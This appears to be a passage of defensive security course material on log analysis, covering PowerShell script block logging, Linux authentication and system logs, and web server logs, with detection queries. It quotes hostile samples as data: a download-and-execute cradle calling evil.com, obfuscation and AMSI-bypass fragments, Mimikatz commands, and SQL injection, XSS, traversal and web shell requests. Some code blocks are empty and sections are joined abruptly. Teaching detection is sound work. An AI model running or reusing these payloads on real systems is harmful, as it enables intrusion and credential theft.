Computer Configuration → Administrative Templates → 
Windows Components → Windows PowerShell → 
Turn on PowerShell Transcription = Enabled
Transcript Output Directory = \\\\server\\share\\transcripts\\
\`\`\`

**Output:** Text files in specified directory

## Script Block Logging (Event 4104)

This is the most valuable for threat detection.

### Example Event

\`\`\`xml
<Event>
  <System>
    <EventID>4104</EventID>
    <TimeCreated SystemTime="2023-10-11T22:14:15Z"/>
  </System>
  <EventData>
    <Data Name="MessageNumber">1</Data>
    <Data Name="MessageTotal">1</Data>
    <Data Name="ScriptBlockText">
      $client = New-Object System.Net.WebClient
      $client.DownloadString("http://evil.com/payload.ps1") | IEX
    </Data>
    <Data Name="ScriptBlockId">{guid}</Data>
    <Data Name="Path">C:\\temp\\malware.ps1</Data>
  </EventData>
</Event>
\`\`\`

### Key Field: ScriptBlockText
This contains the **actual code** that was executed!

## Malicious PowerShell Patterns

### 1. Download and Execute
\`\`\`powershell
# Common patterns
IEX (New-Object Net.WebClient).DownloadString('http://...')
Invoke-Expression (Invoke-WebRequest '...')
IEX (iwr '...')
\`\`\`

### 2. Encoded Commands
\`\`\`powershell
# Base64 encoded
powershell -enc SGVsbG8gV29ybGQ=

# Decodes to actual command in Event 4104
\`\`\`

### 3. Obfuscation Techniques
\`\`\`powershell
# String concatenation
$a = "Net."; $b = "WebClient"; $c = New-Object ($a + $b)

# Character replacement
"IEX" -replace 'X','X'

# Tick marks (backticks)
I\`E\`X

# Variable substitution
$DoIt = 'IEX'; & $DoIt (...)
\`\`\`

### 4. AMSI Bypass Attempts
\`\`\`powershell
# Common bypass patterns to watch for
[Ref].Assembly.GetType('...')
Add-Type -TypeDefinition '...'
'AmsiContext', 'amsiSession'
\`\`\`

### 5. Credential Theft
\`\`\`powershell
# Mimikatz
Invoke-Mimikatz
sekurlsa::logonpasswords

# Credential dumping
[System.Runtime.InteropServices.Marshal]::SecureStringToBSTR
Get-Credential
\`\`\`

## Detection Queries

### Download Cradles
\`\`\`
EventID=4104 
ScriptBlockText matches regex ".*(DownloadString|DownloadFile|WebClient|Invoke-WebRequest|iwr|wget|curl).*"
\`\`\`

### Encoded Commands
\`\`\`
EventID=4104 
ScriptBlockText matches regex "FromBase64String|ToBase64String|[Convert]::FromBase64"
\`\`\`

### AMSI Bypass Attempts
\`\`\`
EventID=4104 
ScriptBlockText matches regex "amsi|AmsiUtils|AmsiContext"
\`\`\`

### Suspicious Keywords
\`\`\`
EventID=4104 
ScriptBlockText contains any of (
  "mimikatz",
  "bloodhound",
  "powersploit",
  "empire",
  "invoke-psexec",
  "invoke-wmi",
  "sekurlsa"
)
\`\`\`

## Analysis Tips

1. **Large script blocks** may be split across multiple 4104 events (check MessageNumber/MessageTotal)

2. **Decode Base64** in ScriptBlockText to see true commands

3. **Correlate with 4688** to see who ran PowerShell

4. **Check ScriptBlockId** to group related events

5. **Path field** shows if script was file-based or console

\`\`\`
Oct 11 10:26:00 server usermod[12347]: add 'newuser' to group 'sudo'
\`\`\`

## PAM Events

PAM (Pluggable Authentication Modules) logs authentication for all services.

### PAM Success
\`\`\`
Oct 11 10:30:00 server sshd[12345]: pam_unix(sshd:session): session opened for user john by (uid=0)
\`\`\`

### PAM Failure
\`\`\`

\`\`\`

## Detection Patterns

### SSH Brute Force Detection
\`\`\`bash
# Count failed logins by IP
grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn

# Find IPs with more than 10 failed attempts
grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | awk '$1 > 10'
\`\`\`

### Successful Logins from Unusual IPs
\`\`\`bash
# List all successful logins with source IPs
grep "Accepted" /var/log/auth.log | awk '{print $1, $2, $3, $9, $11}'
\`\`\`

### Sudo Abuse Detection
\`\`\`bash
# Find failed sudo attempts
grep "authentication failure" /var/log/auth.log | grep sudo

# Find users not in sudoers
grep "NOT in sudoers" /var/log/auth.log
\`\`\`

### Unusual Account Activity
\`\`\`bash
# New user creation
grep "useradd" /var/log/auth.log

# Password changes
grep "password changed" /var/log/auth.log

# Group membership changes
grep "to group" /var/log/auth.log
\`\`\`

# System & Application Logs

Beyond authentication, Linux logs system events, service activity, and application behavior that are valuable for security analysis.

## System Logs

### /var/log/syslog or /var/log/messages

General system messages from various sources.

\`\`\`
Oct 11 10:00:00 server systemd[1]: Starting Apache HTTP Server...
Oct 11 10:00:01 server systemd[1]: Started Apache HTTP Server.
Oct 11 10:05:00 server kernel: [UFW BLOCK] IN=eth0 OUT= MAC=... SRC=192.168.1.100 DST=10.0.0.1 ...
\`\`\`

### /var/log/kern.log

Kernel messages including hardware, drivers, and security events.

\`\`\`

## Analysis Commands

\`\`\`bash
# Find errors in syslog
grep -i "error\\|fail\\|denied\\|block" /var/log/syslog

# Monitor logs in real-time
tail -f /var/log/syslog | grep --line-buffered -i "error"

# Find recent service restarts
journalctl -u "*.service" --since "1 hour ago" | grep -i "start\\|stop"

# View firewall blocks
grep "UFW BLOCK" /var/log/syslog | awk '{print $12}' | cut -d= -f2 | sort | uniq -c | sort -rn
\`\`\`
    `,
    keyTakeaways: [
      "syslog/messages contain general system events from multiple sources",
      "Kernel logs reveal firewall blocks, crashes, and hardware events",
      "Cron logs can expose persistence mechanisms",
      "Package manager logs show software installations and removals",

# Web Server Logs (Apache/Nginx)

Web server logs are essential for detecting web-based attacks, unauthorized access attempts, and reconnaissance activity.

## Apache Log Locations

| Log Type | Default Path |
|----------|--------------|
| Access Log | /var/log/apache2/access.log |
| Error Log | /var/log/apache2/error.log |
| Virtual Host | /var/log/apache2/vhost-access.log |

## Nginx Log Locations

| Log Type | Default Path |
|----------|--------------|
| Access Log | /var/log/nginx/access.log |
| Error Log | /var/log/nginx/error.log |

## Combined Log Format

Most web servers use the **Combined Log Format**:

\`\`\`
%h %l %u %t "%r" %>s %b "%{Referer}i" "%{User-Agent}i"
\`\`\`

### Example Entry
\`\`\`
192.168.1.100 - john [11/Oct/2023:10:00:00 +0000] "GET /admin/login.php HTTP/1.1" 200 1234 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
\`\`\`

### Field Breakdown

| Field | Value | Description |
|-------|-------|-------------|
| %h | 192.168.1.100 | Client IP address |
| %l | - | Identity (usually -) |
| %u | john | Authenticated username |
| %t | [11/Oct/2023:10:00:00 +0000] | Timestamp |
| %r | "GET /admin/login.php HTTP/1.1" | Request line |
| %>s | 200 | HTTP status code |
| %b | 1234 | Response size in bytes |
| Referer | https://example.com/ | Referring URL |
| User-Agent | Mozilla/5.0... | Client browser/tool |

## HTTP Status Codes for Security

| Code | Meaning | Security Relevance |
|------|---------|-------------------|
| 200 | OK | Successful request |
| 301/302 | Redirect | May indicate redirect attacks |
| 400 | Bad Request | Malformed request, possible attack |
| 401 | Unauthorized | Authentication required/failed |
| 403 | Forbidden | Access denied |
| 404 | Not Found | Scanning for files/directories |
| 500 | Server Error | Possible exploitation attempt |
| 503 | Service Unavailable | Overload, possible DDoS |

## Web Attack Patterns

### SQL Injection Attempts
\`\`\`
192.168.1.100 - - [11/Oct/2023:10:00:00] "GET /search?q=1' OR '1'='1 HTTP/1.1" 200 ...
192.168.1.100 - - [11/Oct/2023:10:00:01] "GET /user?id=1 UNION SELECT * FROM users-- HTTP/1.1" 500 ...
\`\`\`

**Indicators:**
- Single quotes (')
- SQL keywords: UNION, SELECT, INSERT, DROP
- Comment characters: --, #, /*
- OR 1=1 patterns

### XSS Attempts
\`\`\`
192.168.1.100 - - [11/Oct/2023:10:00:00] "GET /search?q=<script>alert('xss')</script> HTTP/1.1" 200 ...
\`\`\`

**Indicators:**
- <script> tags
- javascript: URLs
- Event handlers: onerror, onload
- URL-encoded versions: %3Cscript%3E

### Directory Traversal
\`\`\`
192.168.1.100 - - [11/Oct/2023:10:00:00] "GET /files/../../../etc/passwd HTTP/1.1" 200 ...
\`\`\`

**Indicators:**
- ../ sequences
- URL-encoded: %2e%2e%2f
- Targeting sensitive files: /etc/passwd, /etc/shadow

### Web Shell Access
\`\`\`
192.168.1.100 - - [11/Oct/2023:10:00:00] "POST /uploads/shell.php HTTP/1.1" 200 50
192.168.1.100 - - [11/Oct/2023:10:00:01] "GET /uploads/shell.php?cmd=whoami HTTP/1.1" 200 12
\`\`\`

**Indicators:**
- POST to unusual .php files
- GET with cmd, command, c parameters
- Small response sizes (command output)
- Requests to /uploads, /tmp, /temp directories

### Scanner/Bot Activity
\`\`\`
192.168.1.100 - - [11/Oct/2023:10:00:00] "GET /admin HTTP/1.1" 404
192.168.1.100 - - [11/Oct/2023:10:00:01] "GET /administrator HTTP/1.1" 404
192.168.1.100 - - [11/Oct/2023:10:00:02] "GET /wp-admin HTTP/1.1" 404
192.168.1.100 - - [11/Oct/2023:10:00:03] "GET /phpmyadmin HTTP/1.1" 404
\`\`\`

**Indicators:**
- Rapid 404 sequences
- Common admin paths
- WordPress, Drupal, Joomla paths
- Unusual User-Agents: curl, python-requests, nikto

## Analysis Commands

\`\`\`bash
# Top IPs by request count
awk '{print $1}' access.log | sort | uniq -c | sort -rn | head 20

# Find potential SQL injection
grep -E "(SELECT|UNION|INSERT|DROP|--|'|%27)" access.log

# Find 404 scanners
awk '$9 == 404 {print $1}' access.log | sort | uniq -c | sort -rn | head 20

# Find POST requests (potential uploads/exploits)
grep "POST" access.log | awk '{print $1, $7}' | sort | uniq -c | sort -rn

# Find requests to common attack paths
grep -E "(shell|cmd|exec|eval|upload|admin)" access.log

# Analyze User-Agents
awk -F'"' '{print $6}' access.log | sort | uniq -c | sort -rn | head 20

# Find large responses (possible data exfiltration)
awk '$10 > 1000000 {print $1, $7, $10}' access.log
\`\`\`

## Suspicious User-Agents

| User-Agent | Likely Tool |
|------------|-------------|
| sqlmap | SQL injection tool |
| nikto | Web vulnerability scanner |
| nmap | Port scanner |
| python-requests | Scripted attacks |
| curl | Command-line tool |
| Googlebot (fake) | Impersonation |
    `,
    keyTakeaways: [
      "Combined Log Format provides IP, URL, status, referrer, and User-Agent",
      "404 storms indicate directory/file scanning",
      "SQL injection shows as quotes and SQL keywords in URLs",
      "Web shells have distinctive access patterns (cmd parameters)",
      "Unusual User-Agents often indicate automated attacks"
